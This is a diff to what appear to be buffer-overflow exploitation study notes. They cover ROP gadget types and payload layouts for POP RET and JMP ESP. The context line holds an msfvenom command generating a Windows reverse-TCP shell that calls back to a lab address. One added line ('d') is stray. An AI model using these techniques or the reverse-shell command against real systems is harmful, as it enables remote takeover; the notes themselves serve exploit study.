@@ -36,15 +36,17 @@ msfvenom -a x86 --platform Windows -p windows/shell/reverse_tcp LHOST=10.10.14.6
 
 ## Finding ROP in windows immunity debugger
 
-* Different types of ROP gadgets.
+* Different types of ROP gadgets. Depending on the ROP gadget we decide the payload format.
   * JMP ESP
   * POP RET
   * POP POP RET
 * Not when we use ROP gadget, we inject our shellcode inside the "junk" text itself. From experience we  know that "**there is call made back to the stack"** after execution of ROP gadget which points to start of the "junk" address.
-* Here the format of **payload = buf + junk\_remaining + ROP\_addr**
+* The format **payload = buf + junk\_remaining + ROP\_addr** is for **POP RET**
   * where `buf` is our reverse tcp shellcode
   * where `junk_remaining` = junk - len\(buf\)
   * where `ROP_addr` is the address of the ROP gadget.
+* The format **payload = junk + ROP\_addr + shellcode** is for **JMP ESP**
+* d
 
 ### Sample payload
 
